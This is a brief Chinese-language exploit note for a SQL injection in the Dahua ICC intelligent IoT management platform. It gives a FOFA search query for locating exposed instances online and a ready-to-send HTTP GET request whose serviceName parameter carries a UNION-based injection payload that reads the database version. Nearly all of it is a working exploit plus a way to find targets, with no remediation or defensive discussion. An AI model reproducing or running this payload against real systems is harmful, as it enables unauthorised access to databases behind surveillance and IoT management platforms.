# 大华ICC智能物联管理平台SQL注入漏洞

# 漏洞复现

FOFA：body="static/qwebchannel.js"

POC/EXP：

```
GET/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host:127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

![image-20260101183800474](assets/image-20260101183800474.png)
